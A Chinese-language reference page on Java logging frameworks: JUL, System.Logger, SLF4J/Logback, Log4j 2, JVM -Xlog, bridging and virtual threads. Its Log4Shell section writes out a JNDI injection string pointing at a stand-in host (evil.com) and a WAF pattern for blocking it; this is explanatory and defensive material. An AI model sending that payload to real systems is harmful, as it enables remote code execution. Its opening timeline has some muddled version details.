# 日志框架

> java.util.logging、System.Logger、SLF4J、Logback 演进历程

[← 返回 API 框架](../)

---

## 1. 快速概览

```
JDK 1.0 ── JDK 1.4 ── JDK 9 ── JDK 11 ── 2002 ── 2006 ── 2014
   │         │        │        │         │         │         │
System.out  JUL    System.Logger  Log4j  SLF4J  Logback
PrintStream  java.util.  桥接    门面   原生    SLF4J
          logging    支持           实现    实现
```

### 核心演进

| 版本 | 特性 | 说明 |
|------|------|------|
| **JDK 1.0** | System.out | 控制台输出 |
| **JDK 1.4** | java.util.logging (JUL) | 内置日志框架 |
| **JDK 9** | System.Logger | 平台日志 API |
| **JDK 11** | 日志桥接 | SLF4J 桥接支持 |
| **Log4j 1.x** | Apache 日志框架 | 外部实现 |
| **SLF4J** | 日志门面 | 统一日志接口 |
| **Logback** | SLF4J 原生实现 | 高性能日志 |

---

## 目录

- [java.util.logging (JUL)](#javautillogging-jul)
- [System.Logger (JDK 9+)](#systemlogger-jdk-9)
- [SLF4J + Logback](#slf4j--logback)
- [Log4j 2.x](#log4j-2x)
- [JDK 内部日志 — 统一日志框架 (JEP 158)](#jdk-内部日志--统一日志框架-jep-158)
- [日志桥接](#日志桥接)
- [虚拟线程与日志](#虚拟线程与日志-virtual-threads--logging)
- [Log4Shell 事件教训](#log4shell-事件教训-cve-2021-44228)
- [最佳实践](#最佳实践)
- [核心贡献者](#核心贡献者)
- [相关链接](#相关链接)

---

## 2. java.util.logging (JUL)

**JDK 1.4 引入**

### 架构总览 (Handler / Formatter / Filter)

```
Logger ──┬── Handler (ConsoleHandler) ── Formatter (SimpleFormatter)
         │      └── Filter
         ├── Handler (FileHandler)     ── Formatter (XMLFormatter)
         │      └── Filter
         └── Filter (Logger 级别过滤)

父子层次结构:
  "" (root logger)
    └── "com"
         └── "com.example"
              └── "com.example.service"
```

**核心组件说明**:

| 组件 | 职责 | 内置实现 |
|------|------|----------|
| **Logger** | 日志记录入口，层次化命名 (hierarchical naming) | 按 package 层级自动继承 |
| **Handler** | 输出目的地 (output destination) | `ConsoleHandler`, `FileHandler`, `SocketHandler`, `MemoryHandler` |
| **Formatter** | 格式化日志记录 (format LogRecord) | `SimpleFormatter`, `XMLFormatter` |
| **Filter** | 精细过滤 (fine-grained filtering) | 需自定义实现 `Filter.isLoggable()` |
| **LogRecord** | 日志事件载体 (log event carrier) | 包含 level, message, timestamp, source 等 |
| **LogManager** | 全局管理器 (global manager) | 读取配置、管理 Logger 层次树 |

```java
// 自定义 Filter — 过滤敏感词
Filter sensitiveFilter = record ->
    record.getMessage() != null && !record.getMessage().contains("password");
logger.setFilter(sensitiveFilter);

// 自定义 Formatter — JSON 格式输出
class JsonFormatter extends Formatter {
    @Override public String format(LogRecord record) {
        return """
            {"ts":"%s","level":"%s","logger":"%s","msg":"%s"}
            """.formatted(record.getInstant(), record.getLevel(),
                record.getLoggerName(), formatMessage(record));
    }
}

// Handler 组合: pattern, limit(bytes), count, append
FileHandler fh = new FileHandler("app-%g.log", 10_000_000, 5, true);
fh.setFormatter(new JsonFormatter());
fh.setFilter(sensitiveFilter);
logger.addHandler(fh);
```

### 基础使用

```java
import java.util.logging.Logger;
import java.util.logging.Level;

// 获取 Logger
Logger logger = Logger.getLogger(MyClass.class.getName());

// 记录日志
logger.severe("严重错误");
logger.warning("警告");
logger.info("信息");
logger.config("配置");
logger.fine("调试");
logger.finer("更详细的调试");
logger.finest("最详细的调试");

// 使用参数化日志
logger.log(Level.INFO, "用户 {0} 登录，来自 {1}", new Object[]{username, ip});
```

### 配置

```java
// 日志级别
logger.setLevel(Level.ALL);     // 记录所有级别
logger.setLevel(Level.CONFIG);  // 记录 CONFIG 及以上
logger.setLevel(Level.OFF);     // 关闭日志

// Handler - 输出目的地
ConsoleHandler console = new ConsoleHandler();
console.setLevel(Level.ALL);
logger.addHandler(console);

FileHandler fileHandler = new FileHandler("app.log", true);
fileHandler.setLevel(Level.ALL);
logger.addHandler(fileHandler);

// Formatter - 格式化
SimpleFormatter formatter = new SimpleFormatter();
console.setFormatter(formatter);
```

### 配置文件

```properties
# logging.properties
handlers=java.util.logging.ConsoleHandler
.level=INFO

# FileHandler
java.util.logging.FileHandler.pattern=%h/app.log
java.util.logging.FileHandler.limit=1000000
java.util.logging.FileHandler.count=5
java.util.logging.FileHandler.formatter=java.util.logging.SimpleFormatter

# ConsoleHandler
java.util.logging.ConsoleHandler.level=ALL
java.util.logging.ConsoleHandler.formatter=java.util.logging.SimpleFormatter

# 全局级别
.level=INFO

# 包/类级别
com.example.level=FINE
com.example.MyClass.level=FINER
```

```bash
# 启动时指定配置
java -Djava.util.logging.config.file=logging.properties MyClass

# 编程方式重新加载配置 (programmatic reload)
LogManager.getLogManager().readConfiguration(new FileInputStream("logging.properties"));
```

### JUL 的局限性 (limitations)

| 问题 | 说明 |
|------|------|
| **性能** | 参数化日志依赖 `MessageFormat.format()`，比 SLF4J `{}` 占位符慢 |
| **配置刷新** | 无内置热加载 (no hot-reload)，需手动调用 `readConfiguration()` |
| **Handler 线程安全** | `FileHandler` 使用 synchronized，高并发下成为瓶颈 |
| **缺少 MDC** | 无 Mapped Diagnostic Context 支持 |
| **格式化** | 内置 Formatter 功能有限，无 pattern layout |

---

## 3. System.Logger

**JDK 9 引入 (JEP 264)**

### 平台日志 API

```java
import java.lang.System.Logger;
import java.lang.System.Logger.Level;

// 获取 Logger
System.Logger logger = System.getLogger(MyClass.class.getName());

// 记录日志
logger.log(Level.INFO, "用户登录");
logger.log(Level.ERROR, "操作失败", new RuntimeException("详情"));

// 参数化日志
logger.log(Level.DEBUG, "值: {0}", 42);

// 检查日志级别
if (logger.isLoggable(Level.DEBUG)) {
    // 调试代码
}
```

### LoggerFinder

```java
// 自定义 LoggerFinder (服务提供)
public class MyLoggerFinder extends System.LoggerFinder {
    @Override
    public System.Logger getLogger(String name, Module module) {
        return new MyLogger(name);
    }
}

// 配置文件
# META-INF/services/java.lang.System$LoggerFinder
com.example.MyLoggerFinder
```

### 级别映射 (Level Mapping)

```
System.Logger.Level     JUL Level          SLF4J Level
─────────────────────   ──────────────     ───────────
ALL                     ALL                TRACE
TRACE                   FINER              TRACE
DEBUG                   FINE               DEBUG
INFO                    INFO               INFO
WARNING                 WARNING            WARN
ERROR                   SEVERE             ERROR
OFF                     OFF                -
```

### 与 SLF4J / Log4j2 桥接

```
┌──────────────────────────────────────────────────────┐
│  应用代码: System.getLogger("name")                   │
│         ↓                                            │
│  System.LoggerFinder (SPI 服务发现)                    │
│         ↓                                            │
│  ┌─── 无第三方 ──→ 默认 JUL 后端                      │
│  │                                                   │
│  ├─── slf4j-jdk-platform-logging ──→ SLF4J ──→ Logback│
│  │                                                   │
│  └─── log4j-jdk-platform-logging ──→ Log4j2          │
└──────────────────────────────────────────────────────┘
```

```xml
<!-- 让 System.Logger 使用 SLF4J 后端 -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-jdk-platform-logging</artifactId>
    <version>2.0.9</version>
</dependency>

<!-- 让 System.Logger 使用 Log4j2 后端 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-jpl</artifactId>
    <version>2.23.1</version>
</dependency>
```

```java
// 验证当前使用的 LoggerFinder
System.Logger logger = System.getLogger("test");
System.out.println(logger.getClass());
// 默认: jdk.internal.logger.SimpleConsoleLogger
// SLF4J: org.slf4j.jdk.platform.logging.SLF4JPlatformLogger
```

### JUL 桥接

```java
// JDK 9+ 自动使用 JUL 作为默认后端
// 无需额外配置

// 自定义后端
// 通过 LoggerFinder 实现
```

---

## 4. SLF4J + Logback

### SLF4J 门面

```xml
<!-- Maven 依赖 -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-api</artifactId>
    <version>2.0.9</version>
</dependency>

<!-- Logback 绑定 -->
<dependency>
    <groupId>ch.qos.logback</groupId>
    <artifactId>logback-classic</artifactId>
    <version>1.4.14</version>
</dependency>
```

```java
// SLF4J 使用
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

Logger logger = LoggerFactory.getLogger(MyClass.class);

// 占位符日志
logger.info("用户 {} 登录，来自 {}", username, ip);
logger.debug("调试信息: {}", data);
logger.error("错误: {}", error, exception);
```

### Logback 配置

```xml
<!-- logback.xml -->
<configuration>
    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>

    <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>app.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>app.%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>30</maxHistory>
        </rollingPolicy>
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>

    <root level="INFO">
        <appender-ref ref="STDOUT" />
        <appender-ref ref="FILE" />
    </root>

    <logger name="com.example" level="DEBUG"/>
</configuration>
```

---

## 5. Log4j 2.x

### 配置

```xml
<!-- log4j2.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
        <File name="File" fileName="logs/app.log">
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </File>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="File"/>
        </Root>
    </Loggers>
</Configuration>
```

### 使用

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

Logger logger = LogManager.getLogger(MyClass.class);

// 记录日志
logger.info("信息");
logger.debug("调试");
logger.error("错误", exception);

// Lambda 延迟计算
logger.debug(() -> "计算密集型调试信息: " + expensiveComputation());

// Fluent API
logger.entry();
// 方法代码
logger.exit();
logger.throwing(exception);
```

---

## 6. JDK 内部日志 — 统一日志框架 (JEP 158)

**JDK 9 引入** — `-Xlog` 统一 JVM 内部日志 (Unified JVM Logging)

### 概念模型

```
-Xlog:[what]=[level]:[output]:[decorators][:output-options]

what        = 标签选择器 (tag selector)，如 gc, compiler, os
level       = off | error | warning | info | debug | trace
output      = stdout | stderr | file=<path>
decorators  = 元信息 (metadata)，如 time, uptime, pid, tid, level, tags
```

### 常用示例

```bash
java -Xlog:help                              # 查看所有可用标签和级别
java -Xlog:gc*=info:file=gc.log:time,uptime,level,tags:filecount=5,filesize=10m MyApp
java -Xlog:class+load=info:stdout:time,level # 类加载日志
java -Xlog:jit+compilation=debug:file=jit.log # JIT 编译日志
java -Xlog:os+thread=info                     # 线程日志
java -Xlog:all=off MyApp                      # 关闭所有 JVM 日志
java -Xlog:all=warning MyApp                  # 仅 warning 及以上

# 多个 -Xlog 可叠加
java -Xlog:gc*=info:file=gc.log \
     -Xlog:class+load=debug:file=classload.log \
     -Xlog:safepoint=trace:stdout MyApp
```

### 标签 (Tags) 一览

| 标签类别 | 常用标签 | 典型用途 |
|----------|----------|----------|
| **GC** | `gc`, `gc+heap`, `gc+age`, `gc+phases` | GC 调优、停顿分析 |
| **Class** | `class+load`, `class+unload`, `class+resolve` | 类加载问题排查 |
| **JIT** | `jit+compilation`, `jit+inlining` | 编译优化分析 |
| **Thread** | `os+thread`, `thread+smr` | 线程生命周期 |
| **Module** | `module+load`, `module+patch` | 模块系统调试 |
| **Safepoint** | `safepoint` | STW 停顿分析 |

### 装饰器 (Decorators)

| 装饰器 | 说明 | 示例输出 |
|--------|------|----------|
| `time` | ISO-8601 时间戳 | `[2026-03-22T10:15:30.123+0800]` |
| `utctime` | UTC 时间 | `[2026-03-22T02:15:30.123Z]` |
| `uptime` | JVM 启动秒数 | `[1.234s]` |
| `pid` | 进程 ID | `[12345]` |
| `tid` | 线程 ID | `[67890]` |
| `level` | 日志级别 | `[info]` |
| `tags` | 标签名 | `[gc,heap]` |

```bash
java -Xlog:gc=info:stdout:time,pid,tid,level,tags
# → [2026-03-22T10:15:30.123+0800][12345][67890][info][gc] GC(3) Pause Young ...
```

### -Xlog 与传统 GC 标志对照

| 旧标志 (JDK 8) | 新标志 (JDK 9+) |
|----------------|-----------------|
| `-XX:+PrintGCDetails` | `-Xlog:gc*=info` |
| `-XX:+PrintGCDateStamps` | `-Xlog:gc*=info:stdout:time` |
| `-Xloggc:gc.log` | `-Xlog:gc*:file=gc.log` |
| `-XX:+PrintClassLoading` | `-Xlog:class+load=info` |
| `-XX:+TraceClassLoading` | `-Xlog:class+load=debug` |

---

## 7. 日志桥接

### 桥接全景图 (Bridge Overview)

```
┌─────────────────── 日志 API（应用代码调用）───────────────────┐
│  JUL          JCL            Log4j 1.x       System.Logger  │
│   │            │               │                  │          │
│   ▼            ▼               ▼                  ▼          │
│ jul-to-    jcl-over-     log4j-over-    slf4j-jdk-platform-  │
│  slf4j      slf4j          slf4j          logging            │
│   │            │               │                  │          │
│   └────────────┴───────────────┴──────────────────┘          │
│                           │                                  │
│                    SLF4J API (门面)                           │
│                           │                                  │
│              ┌────────────┼────────────┐                     │
│              ▼            ▼            ▼                     │
│          Logback      Log4j2       JUL                       │
│         (native)    (log4j-slf4j   (slf4j-jdk14)            │
│                       -impl)                                 │
└──────────────────────────────────────────────────────────────┘

⚠️ 桥接循环警告 (Circular Bridging):
   不能同时使用 jul-to-slf4j + slf4j-jdk14
   不能同时使用 log4j-to-slf4j + log4j-slf4j-impl
   否则会产生无限递归 StackOverflowError
```

### JUL → SLF4J → Logback 完整链路

```xml
<!-- 步骤 1: 添加桥接依赖 -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>jul-to-slf4j</artifactId>
    <version>2.0.9</version>
</dependency>
<dependency>
    <groupId>ch.qos.logback</groupId>
    <artifactId>logback-classic</artifactId>
    <version>1.4.14</version>
</dependency>
```

```java
// 步骤 2: 在应用启动时安装桥接 (必须调用)
import org.slf4j.bridge.SLF4JBridgeHandler;

// 移除 JUL 默认 Handler，安装 SLF4J 桥接
SLF4JBridgeHandler.removeHandlersForRootLogger();
SLF4JBridgeHandler.install();

// Spring Boot 中自动配置 (spring-boot-starter-logging 已包含)
// 无需手动调用，但需确保 jul-to-slf4j 在 classpath 上
```

```java
// 步骤 3: 验证桥接生效
java.util.logging.Logger julLogger =
    java.util.logging.Logger.getLogger("com.example");
julLogger.info("这条消息会通过 SLF4J 输出到 Logback");
// 在 Logback 的 appender 中可以看到此消息
```

### Log4j to SLF4J

```xml
<!-- log4j-to-slf4j -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-to-slf4j</artifactId>
    <version>2.23.1</version>
</dependency>
```

### JCL to SLF4J

```xml
<!-- commons-logging 适配 -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>jcl-over-slf4j</artifactId>
    <version>1.7.36</version>
</dependency>
```

### SLF4J to JUL

```xml
<!-- slf4j-jdk14: SLF4J 输出到 JUL (JDK 8+) -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-jdk14</artifactId>
    <version>2.0.9</version>
</dependency>
```

---

## 8. 虚拟线程与日志 (Virtual Threads & Logging)

**JDK 21+** — 虚拟线程 (virtual threads) 带来百万级并发，日志系统面临新挑战。

### 核心问题：日志背压 (Log Backpressure)

```
传统线程模型 (数百线程):
  线程数少 → 日志写入速度 < 磁盘 I/O → 无背压问题

虚拟线程模型 (数十万线程):
  百万级虚拟线程同时写日志 → AsyncAppender 队列溢出 → 背压
                           → 同步写入阻塞 carrier thread → 吞吐下降
```

### 问题与对策

| 问题 | 影响 | 解决方案 |
|------|------|----------|
| **synchronized 锁** | JUL `FileHandler` 使用 synchronized，pin 住 carrier thread | 使用 SLF4J/Logback 替代 JUL |
| **AsyncAppender 队列满** | 默认 `queueSize=256`，虚拟线程并发下快速溢出 | 增大队列 + 设置 `neverBlock=true` |
| **MDC 传播** | 虚拟线程 inherit 的是创建时的 MDC 快照 | 使用 ScopedValue (JDK 21 preview) 或手动传播 |
| **线程名爆炸** | 日志中大量 `VirtualThread[#12345]` | 使用 `Thread.ofVirtual().name("worker-", 0)` 命名 |

### AsyncAppender 推荐配置

```xml
<!-- Logback: 适配虚拟线程的 AsyncAppender -->
<appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
    <appender-ref ref="FILE" />
    <queueSize>8192</queueSize>           <!-- 增大队列容量 -->
    <discardingThreshold>0</discardingThreshold>  <!-- 不丢弃任何级别 -->
    <neverBlock>true</neverBlock>         <!-- 队列满时丢弃而非阻塞 -->
    <includeCallerData>false</includeCallerData>  <!-- 关闭调用者信息以提升性能 -->
</appender>

<!-- Log4j2: AsyncLogger (基于 LMAX Disruptor，性能更优) -->
<!-- log4j2.xml 中使用 <AsyncRoot> 或 <AsyncLogger> 替代同步版本 -->
<!-- 需添加 disruptor 依赖: com.lmax:disruptor:3.4.4 -->
```

```java
// MDC 在虚拟线程中的手动传播
Map<String, String> parentMdc = MDC.getCopyOfContextMap();
Thread.startVirtualThread(() -> {
    if (parentMdc != null) MDC.setContextMap(parentMdc);
    try {
        logger.info("虚拟线程中的日志，MDC 已传播");
    } finally { MDC.clear(); }
});
// 替代方案: 使用 ScopedValue (JDK 21+ preview) 自动继承
```

---

## 9. Log4Shell 事件教训 (CVE-2021-44228)

### 漏洞概述

```
时间: 2021-12-09 公开披露
影响: Log4j 2.0-beta9 ~ 2.14.1（CVSS 评分 10.0，最高危）
根因: Log4j2 的 Message Lookup Substitution 功能
      支持在日志消息中解析 JNDI 表达式

攻击链:
  攻击者 → HTTP Header: ${jndi:ldap://evil.com/exploit}
       → Log4j2 记录请求头 → 触发 JNDI Lookup
       → 连接恶意 LDAP → 下载并执行恶意 class → RCE
```

### 受影响与不受影响

| 组件 | 是否受影响 | 说明 |
|------|-----------|------|
| **Log4j 2.0~2.14.1** | 受影响 | 核心漏洞所在 |
| **Log4j 2.15.0** | 部分修复 | 默认禁用 Lookup，但仍有绕过 (CVE-2021-45046) |
| **Log4j 2.17.0+** | 已修复 | 完全移除 JNDI Lookup 默认行为 |
| **Log4j 1.x** | 不受此 CVE 影响 | 无 Lookup 功能（但有其他漏洞） |
| **JUL** | 不受影响 | 无表达式解析功能 |
| **SLF4J / Logback** | 不受影响 | 无 JNDI Lookup 机制 |
| **System.Logger** | 不受影响 | 仅门面 API |

### 防护措施 (Mitigation)

| 优先级 | 措施 | 命令/配置 |
|--------|------|-----------|
| **1 (推荐)** | 升级 Log4j2 至 2.17.1+ | `<log4j.version>2.23.1</log4j.version>` |
| **2** | 禁用 JNDI 远程加载 (JDK 8u121+) | `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false` |
| **3** | 禁用 Lookup (Log4j 2.10~2.14.1) | `-Dlog4j2.formatMsgNoLookups=true` |
| **4 (紧急)** | 移除 JndiLookup 类 | `zip -q -d log4j-core-*.jar org/.../JndiLookup.class` |

### 长期教训 (Lessons Learned)

| 教训 | 行动 |
|------|------|
| **日志框架不应执行表达式** | 日志消息应当是纯文本，不应触发任何副作用 |
| **SBOM (软件物料清单)** | 维护依赖清单，快速定位受影响组件 |
| **依赖扫描** | 使用 `mvn dependency:tree` / `gradle dependencies` 定期审计 |
| **最小权限** | 网络出站白名单，阻止 JNDI 连接外部服务器 |
| **WAF 规则** | 拦截 `${jndi:` 模式的请求 |

---

## 10. 最佳实践

### 日志级别

```
ERROR   - 错误，需要立即处理
WARN    - 警告，可能需要关注
INFO    - 信息，重要业务流程
DEBUG   - 调试，开发阶段使用
TRACE   - 跟踪，最详细的调试信息
```

### 格式化

```java
// 占位符
logger.info("用户: {}, 年龄: {}", user.getName(), user.getAge());

// 异常堆栈
logger.error("处理失败", exception);

// 性能考虑: 延迟计算
if (logger.isDebugEnabled()) {
    logger.debug("调试信息: {}", expensiveOperation());
}

// SLF4J 参数化日志 (性能最佳)
logger.debug("用户: {}", user);  // 只有启用 DEBUG 才格式化
```

### 异步日志

> 详见 [虚拟线程与日志](#虚拟线程与日志-virtual-threads--logging) 中的 AsyncAppender 推荐配置。

### MDC (Mapped Diagnostic Context)

```java
import org.slf4j.MDC;

// 设置上下文
MDC.put("userId", "123");
MDC.put("sessionId", "abc");

try {
    // 业务逻辑
    logger.info("用户操作");
} finally {
    MDC.clear();
}

// Logback 配置
<pattern>[%X{userId}] [%X{sessionId}] %msg%n</pattern>
```

---

## 11. 核心贡献者

> **统计来源**: 本地 JDK 源码 master 分支 git 历史分析
> **统计时间**: 2026-03-20

### 日志 (按 Git 提交数)

| 排名 | 贡献者 | 提交数 | 组织 | 主要贡献 |
|------|--------|--------|------|----------|
| 1 | Daniel Fuchs | 15 | Oracle | 日志框架 |
| 2 | Roger Riggs | 3 | Oracle | 核心库 |
| 3 | Pavel Rappo | 3 | Oracle | API 设计 |
| 4 | Mandy Chung | 3 | Oracle | 模块系统 |
| 5 | Joe Darcy | 3 | Oracle | API 设计 |

### 历史贡献者

| 贡献者 | 公司 | 主要贡献 |
|--------|------|----------|
| **Ceki Gülcü** | QOS.ch | Logback 创始人、SLF4J 创始人 |
| **Ceki Gülcü** | | Log4j 1.x 创始人 |

---

## 12. Git 提交历史

> 基于 OpenJDK master 分支分析

### 日志改进 (2024-2026)

```bash
# 查看日志相关提交
cd /path/to/jdk
git log --oneline -- src/java.base/share/classes/java/util/logging/
```

---

## 13. 相关链接

### 内部文档

- [日志时间线](timeline.md) - 详细的历史演进
- [核心 API](../)

### 外部资源

- [SLF4J 官方文档](https://www.slf4j.org/)
- [Logback 官方文档](https://logback.qos.ch/)
- [Log4j 2.x 官方文档](https://logging.apache.org/log4j/2.x/)
- [JEP 264](/jeps/api/jep-264.md)
- [SLF4J Legacy (JUL to SLF4J)](https://www.slf4j.org/legacy.html)

### 桥接文档

- [Logback + System.Logger](https://stackoverflow.com/questions/77801438/java-logback-system-logger-logback-java-lang-system-loggerfinder-implementati)
- [JUL to SLF4J Bridge](https://tersesystems.github.io/terse-logback/1.0.0/guide/slf4jbridge/)
- [SLF4J JDK Platform Logging](https://www.slf4j.org/android/org/slf4j/slf4j-jdk-platform-logging/)

---

**最后更新**: 2026-03-22

**Sources**:
- [JEP 264](/jeps/api/jep-264.md)
- [SLF4J 官方文档](https://www.slf4j.org/)
- [Logback 官方文档](https://logback.qos.ch/)
- [Log4j 2.x 官方文档](https://logging.apache.org/log4j/2.x/)
- [JUL to SLF4J Bridge](https://tersesystems.github.io/terse-logback/1.0.0/guide/slf4jbridge/)
